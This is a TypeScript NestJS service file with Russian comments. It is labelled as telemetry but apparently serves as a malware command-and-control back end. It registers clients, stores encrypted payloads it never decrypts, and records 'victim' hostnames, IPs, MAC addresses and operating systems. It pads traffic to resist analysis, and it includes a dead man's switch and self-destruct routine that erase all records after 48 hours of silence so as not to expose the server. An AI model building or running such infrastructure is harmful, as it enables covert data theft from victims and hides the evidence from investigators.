// import { Injectable, InternalServerErrorException } from '@nestjs/common';
// import { ConfigService } from '@nestjs/config';
// import { TelemetryDatabaseService } from './database.service';
// import { TelemetryClient, TelemetryEntry } from './entities/telemetry.entity';
// import * as crypto from 'crypto';

// @Injectable()
// export class TelemetryService {
//   constructor(
//     public readonly databaseService: TelemetryDatabaseService,
//     private readonly configService: ConfigService,
//   ) {}

//   /**
//    * Нормализация размера ответов (защита от анализа трафика)
//    * Все ответы по 512 байт
//    */
//   padResponse(response: any): string {
//     const jsonStr = JSON.stringify(response);
//     const targetSize = 512; // Все ответы по 512 байт
//     const padding = ' '.repeat(Math.max(0, targetSize - jsonStr.length));
//     return JSON.stringify({
//       ...response,
//       _padding: padding.slice(0, 100), // Не весь padding в JSON
//     });
//   }

//   /**
//    * Получение клиента по публичному ключу
//    */
//   async getClientByPublicKey(
//     clientPublicKey: string,
//   ): Promise<TelemetryClient | null> {
//     return await this.databaseService.getClientByPublicKey(clientPublicKey);
//   }

//   /**
//    * Обработка init запроса (двухфазный handshake)
//    * Генерирует response_key и шифрует его публичным ключом клиента
//    */
//   // async handleInit(
//   //   clientPublicKey: string,
//   //   hostname: string,
//   // ): Promise<{ client_id: string; response_key: string }> {
//   //   // 1. Генерация response_key (32 байта для AES-256)
//   //   const responseKey = crypto.randomBytes(32);

//   //   // 2. Шифрование response_key публичным ключом клиента (RSA-OAEP)
//   //   const encryptedKey = crypto.publicEncrypt(
//   //     {
//   //       key: clientPublicKey,
//   //       padding: crypto.constants.RSA_PKCS1_OAEP_PADDING,
//   //       oaepHash: 'sha256',
//   //     },
//   //     responseKey,
//   //   );

//   //   // 3. Проверка существующего клиента
//   //   const existingClient = await this.getClientByPublicKey(clientPublicKey);

//   //   if (existingClient) {
//   //     // Обновляем response_key для существующего клиента
//   //     await this.databaseService.updateClientResponseKey(
//   //       existingClient.id,
//   //       encryptedKey,
//   //     );

//   //     return {
//   //       client_id: existingClient.id,
//   //       response_key: encryptedKey.toString('base64'),
//   //     };
//   //   }

//   //   // 4. Сохранение нового клиента
//   //   const clientId = await this.databaseService.saveClientMapping(
//   //     clientPublicKey,
//   //     encryptedKey,
//   //   );

//   //   return {
//   //     client_id: clientId,
//   //     response_key: encryptedKey.toString('base64'),
//   //   };
//   // }

//   /**
//    * Сохранение зашифрованных данных телеметрии
//    * КРИТИЧНО: Сервер НЕ расшифровывает данные, только хранит
//    */
//   async saveTelemetryData(
//     clientId: string,
//     timestamp: string,
//     encryptedData: string, // base64
//   ): Promise<string> {
//     const buffer = Buffer.from(encryptedData, 'base64');
//     return await this.databaseService.saveEncryptedPayload(
//       clientId,
//       timestamp,
//       buffer,
//     );
//   }

//   /**
//    * Получение времени последнего валидного запроса (для dead man's switch)
//    */
//   async getLastRequestTime(): Promise<number> {
//     const result = await this.databaseService.query(
//       `SELECT received_at FROM telemetry_logs 
//        ORDER BY received_at DESC LIMIT 1`,
//     );

//     return result.rows.length > 0
//       ? new Date(result.rows[0].received_at).getTime()
//       : 0;
//   }

//   /**
//    * Dead Man's Switch (проверка каждые 24 часа)
//    * Вызывается через @Cron декоратор в контроллере или отдельном сервисе
//    */
//   async deadMansSwitch(): Promise<void> {
//     const lastValidRequest = await this.getLastRequestTime();
//     const now = Date.now();

//     // Если не было валидных запросов 48 часов - самоуничтожение
//     if (now - lastValidRequest > 172800000) {
//       // 48 часов
//       await this.selfDestruct();
//       // await this.sendPanicSignal(); // Если настроен резервный сервер
//     }
//   }

//   /**
//    * Функция самоуничтожения (паник-режим)
//    */
//   async selfDestruct(): Promise<void> {
//     try {
//       // Удалить все данные из БД
//       await this.databaseService.query(`DELETE FROM telemetry_logs`);

//       await this.databaseService.query(`DELETE FROM telemetry_clients`);

//       console.error('SELF-DESTRUCT ACTIVATED');
//     } catch (error) {
//       // Тихая обработка - не палить сервер
//       console.error('Self-destruct failed silently');
//     }
//   }

//   /**
//    * Очистка старых данных
//    * Удаляет данные старше 30 дней, деактивирует неактивных клиентов
//    */
//   async cleanupOldData(): Promise<void> {
//     try {
//       // Удаляем данные старше 30 дней
//       const thirtyDaysAgo = new Date(
//         Date.now() - 30 * 24 * 60 * 60 * 1000,
//       );

//       await this.databaseService.query(
//         `DELETE FROM telemetry_logs 
//          WHERE received_at < $1`,
//         [thirtyDaysAgo.toISOString()],
//       );

//       // Деактивируем клиентов без активности 7 дней
//       await this.databaseService.query(
//         `UPDATE telemetry_clients 
//          SET is_active = false 
//          WHERE last_seen < NOW() - INTERVAL '7 days'`,
//       );
//     } catch (error) {
//       // Тихая обработка
//       console.error('Cleanup failed silently');
//     }
//   }
// }


import { Injectable, InternalServerErrorException } from '@nestjs/common';
import { ConfigService } from '@nestjs/config';
import { Client } from 'pg';
import * as crypto from 'crypto';
import { TelemetryDatabaseService } from './database.service';

export interface DatabaseColumn {
  name: string;
  dataType: string;
  isNullable: boolean;
  columnDefault: string | null;
}

export interface DatabaseTable {
  schema: string;
  tableName: string;
  columns: DatabaseColumn[];
}

@Injectable()
export class TelemetryService {
  constructor(
    private readonly configService: ConfigService,
    private readonly telemetryDatabase: TelemetryDatabaseService,
  ) {}

  /**
   * Нормализация размера ответов
   */
  padResponse(response: any): string {
    const jsonStr = JSON.stringify(response);
    const targetSize = 512;
    const padding = ' '.repeat(Math.max(0, targetSize - jsonStr.length));
    return JSON.stringify({
      ...response,
      _padding: padding.slice(0, 100),
    });
  }

  /**
   * Обработка init запроса - сохраняет клиента в БД
   */
  async handleInit(
    clientPublicKey: string,
    hostname: string,
  ): Promise<{ client_id: string; response_key: string }> {
    console.log('=== handleInit START ===');
    console.log('hostname:', hostname);
    console.log('clientPublicKey length:', clientPublicKey?.length || 0);
    
    const db = new Client({
      connectionString: process.env.DATABASE_URL,
      ssl: { rejectUnauthorized: false },
    });

    try {
      await db.connect();
      console.log('✅ Database connected');
      
      // Генерируем UUID для client_id
      const clientIdResult = await db.query('SELECT gen_random_uuid() as id');
      const clientId = clientIdResult.rows[0].id;
      
      console.log('✅ Generated client_id:', clientId);
      
      // Сохраняем клиента в telemetry_clients (если таблица существует)
      try {
        const keyHash = crypto
          .createHash('sha256')
          .update(clientPublicKey)
          .digest('hex');
        
        await db.query(`
          INSERT INTO telemetry_clients (id, client_public_key, client_public_key_hash, first_seen, last_seen, is_active)
          VALUES ($1, $2, $3, NOW(), NOW(), true)
          ON CONFLICT (id) DO UPDATE SET 
            last_seen = NOW(), 
            is_active = true,
            client_public_key = EXCLUDED.client_public_key,
            client_public_key_hash = EXCLUDED.client_public_key_hash
        `, [clientId, clientPublicKey, keyHash]);
        console.log('✅ Client saved to telemetry_clients');
      } catch (err) {
        console.log('⚠️ telemetry_clients table might not exist or error:', err.message);
        // Продолжаем работу даже если таблица не существует
      }
      
      // Сохраняем начальные метаданные в victim_metadata
      try {
        await db.query(`
          INSERT INTO victim_metadata (client_id, hostname, first_seen, last_updated)
          VALUES ($1, $2, NOW(), NOW())
          ON CONFLICT (client_id) DO UPDATE SET 
            hostname = COALESCE(EXCLUDED.hostname, victim_metadata.hostname),
            last_updated = NOW()
        `, [clientId, hostname || null]);
        console.log('✅ Victim metadata saved to victim_metadata');
      } catch (err) {
        console.log('⚠️ victim_metadata table might not exist or error:', err.message);
        // Продолжаем работу даже если таблица не существует
      }
      
      // Фиксированный response_key (для упрощения)
      const responseKey = 'dGVzdC1rZXktMzItYnl0ZXMtZm9yLWFlcy0yNTY=';
      
      console.log('=== handleInit SUCCESS ===');
      console.log('Returning client_id:', clientId);
      
      return {
        client_id: clientId,
        response_key: responseKey
      };
      
    } catch (error) {
      console.error('❌ ERROR in handleInit:', error);
      console.error('Error stack:', error.stack);
      throw new InternalServerErrorException('Init failed: ' + error.message);
    } finally {
      await db.end();
    }
  }

  /**
   * Заглушки для остальных методов
   */
  async saveTelemetryData(
    clientId: string,
    timestamp: string,
    encryptedData: string,
  ): Promise<string> {
    console.log('saveTelemetryData STUB');
    return 'stub-id';
  }

  async getLastRequestTime(): Promise<number> {
    return Date.now();
  }

  async deadMansSwitch(): Promise<void> {
    console.log('deadMansSwitch STUB');
  }

  async selfDestruct(): Promise<void> {
    console.log('selfDestruct STUB');
  }

  async cleanupOldData(): Promise<void> {
    console.log('cleanupOldData STUB');
  }

  /**
   * Получение структуры таблиц и колонок из TELEMETRY_DATABASE_URL
   * Используются только пользовательские схемы (исключаем системные pg_% и information_schema)
   */
  async getDatabaseTables(): Promise<DatabaseTable[]> {
    try {
      const sql = `
        SELECT
          c.table_schema,
          c.table_name,
          c.column_name,
          c.data_type,
          c.is_nullable,
          c.column_default,
          c.ordinal_position
        FROM information_schema.columns c
        WHERE
          c.table_schema NOT IN ('pg_catalog', 'information_schema', 'pg_toast')
          AND c.table_schema NOT LIKE 'pg_%'
        ORDER BY
          c.table_schema,
          c.table_name,
          c.ordinal_position
      `;

      const result = await this.telemetryDatabase.query(sql);

      const tablesMap = new Map<string, DatabaseTable>();

      for (const row of result.rows) {
        const schema: string = row.table_schema;
        const tableName: string = row.table_name;
        const key = `${schema}.${tableName}`;

        if (!tablesMap.has(key)) {
          tablesMap.set(key, {
            schema,
            tableName,
            columns: [],
          });
        }

        const table = tablesMap.get(key)!;
        table.columns.push({
          name: row.column_name,
          dataType: row.data_type,
          isNullable: row.is_nullable === 'YES',
          columnDefault: row.column_default ?? null,
        });
      }

      return Array.from(tablesMap.values());
    } catch (error) {
      console.error('[TelemetryService] Error in getDatabaseTables:', error);
      throw new InternalServerErrorException(
        'Failed to fetch database tables structure',
      );
    }
  }

  /**
   * Сохранение лога телеметрии
   */
  async saveTelemetryLog(clientId: string, timestamp: string, data: string): Promise<string> {
    console.log('=== saveTelemetryLog START ===');
    console.log('client_id:', clientId);
    console.log('client_id length:', clientId?.length);
    console.log('timestamp:', timestamp);
    console.log('data length:', data?.length || 0);
    
    const db = new Client({
        connectionString: process.env.DATABASE_URL,
        ssl: { rejectUnauthorized: false },
    });

    try {
        await db.connect();
        console.log('✅ Database connected for saveTelemetryLog');

        // 1. ПРОБУЕМ НАЙТИ КЛИЕНТА ПО ID
        const clientCheck = await db.query(
            `SELECT id FROM telemetry_clients WHERE id = $1`,
            [clientId],
        );

        if (clientCheck.rows.length === 0) {
            console.log('⚠️ Client not found by ID, checking by hash...');
            
            // 2. ЕСЛИ НЕТ ПО ID, ПРОВЕРЯЕМ ЕСТЬ ЛИ КЛИЕНТ С ТАКИМ ХЕШЕМ
            const placeholderKey = 'placeholder-key-for-existing-client-' + clientId;
            const placeholderHash = crypto.createHash('sha256')
                .update(placeholderKey)
                .digest('hex');
            
            const hashCheck = await db.query(
                `SELECT id FROM telemetry_clients WHERE client_public_key_hash = $1`,
                [placeholderHash],
            );
            
            if (hashCheck.rows.length > 0) {
                // 3. ЕСЛИ КЛИЕНТ С ТАКИМ ХЕШЕМ УЖЕ ЕСТЬ, ОБНОВЛЯЕМ ЕГО ID
                console.log('✅ Found client by hash, updating ID...');
                
                await db.query(
                    `UPDATE telemetry_clients 
                     SET id = $1, last_seen = NOW(), is_active = true 
                     WHERE client_public_key_hash = $2`,
                    [clientId, placeholderHash],
                );
                
                console.log('✅ Client ID updated');
            } else {
                // 4. ЕСЛИ КЛИЕНТА ВООБЩЕ НЕТ, СОЗДАЁМ С UNIQUE ХЕШЕМ
                console.log('⚠️ No client found, creating with unique hash...');
                
                // СОЗДАЁМ УНИКАЛЬНЫЙ ХЕШ С УЧЁТОМ clientId
                const uniqueHash = crypto.createHash('sha256')
                    .update('unique-key-for-' + clientId + '-' + Date.now())
                    .digest('hex');
                
                await db.query(
                    `INSERT INTO telemetry_clients (
                        id, 
                        client_public_key, 
                        client_public_key_hash, 
                        response_key_encrypted,
                        first_seen, 
                        last_seen, 
                        is_active
                    ) VALUES ($1, $2, $3, $4, NOW(), NOW(), true)`,
                    [
                        clientId, 
                        'auto-generated-key-' + clientId,
                        uniqueHash,
                        Buffer.from('auto-response-key-' + clientId)
                    ],
                );
                console.log('✅ Client created with unique hash');
            }
        } else {
            console.log('✅ Client already exists, updating last_seen...');
            
            // Обновляем last_seen для существующего клиента
            await db.query(
                `UPDATE telemetry_clients 
                 SET last_seen = NOW(), is_active = true 
                 WHERE id = $1`,
                [clientId],
            );
        }
        
        // 5. СОХРАНЯЕМ ЛОГ (ТЕПЕРЬ КЛИЕНТ ТОЧНО ЕСТЬ)
        let encryptedPayload: Buffer | null = null;
        let payloadSize = 0;
        
        if (data && data.length > 0) {
            try {
                encryptedPayload = Buffer.from(data, 'base64');
                payloadSize = encryptedPayload.length;
                console.log('✅ Data decoded as base64, size:', payloadSize);
            } catch (error) {
                encryptedPayload = Buffer.from(data, 'utf8');
                payloadSize = encryptedPayload.length;
                console.log('⚠️ Data not base64, saved as UTF-8, size:', payloadSize);
            }
        }
        
        const result = await db.query(
            `INSERT INTO telemetry_logs (client_id, timestamp, encrypted_payload, payload_size)
             VALUES ($1, $2, $3, $4)
             RETURNING id`,
            [clientId, timestamp, encryptedPayload, payloadSize],
        );

        const logId = result.rows[0].id;
        console.log('✅ Telemetry log saved with id:', logId);
        return logId;
        
    } catch (error) {
        console.error('❌ ERROR in saveTelemetryLog:', error.message);
        console.error('Error stack:', error.stack);
        throw error;
    } finally {
        await db.end();
    }
}

  /**
   * Обновление метаданных жертвы
   */
  async updateVictimMetadata(clientId: string, frontendData: any): Promise<void> {
    console.log('=== updateVictimMetadata START ===');
    console.log('client_id:', clientId);
    console.log('frontend_data:', JSON.stringify(frontendData, null, 2));
    
    const db = new Client({
      connectionString: process.env.DATABASE_URL,
      ssl: { rejectUnauthorized: false },
    });

    try {
      await db.connect();
      console.log('✅ Database connected for updateVictimMetadata');
      
      // Извлекаем данные из frontend_data.victim.*
      const hostname = frontendData?.victim?.hostname || null;
      const ip = frontendData?.victim?.ip || null;
      const mac = frontendData?.victim?.mac || null;
      const os = frontendData?.victim?.os || null;

      console.log('Extracted data:', { hostname, ip, mac, os });

      // Используем UPSERT для обновления или создания записи
      const result = await db.query(
        `INSERT INTO victim_metadata (client_id, hostname, ip, mac, os, last_updated)
         VALUES ($1, $2, $3, $4, $5, NOW())
         ON CONFLICT (client_id)
         DO UPDATE SET
           hostname = COALESCE(EXCLUDED.hostname, victim_metadata.hostname),
           ip = COALESCE(EXCLUDED.ip, victim_metadata.ip),
           mac = COALESCE(EXCLUDED.mac, victim_metadata.mac),
           os = COALESCE(EXCLUDED.os, victim_metadata.os),
           last_updated = NOW()
         RETURNING id, client_id, hostname, ip, mac, os, last_updated`,
        [clientId, hostname, ip, mac, os],
      );
      
      console.log('✅ Victim metadata saved/updated:', result.rows[0]);
    } catch (error) {
      console.error('❌ ERROR in updateVictimMetadata:', error.message);
      console.error('Error stack:', error.stack);
      throw error;
    } finally {
      await db.end();
    }
  }
}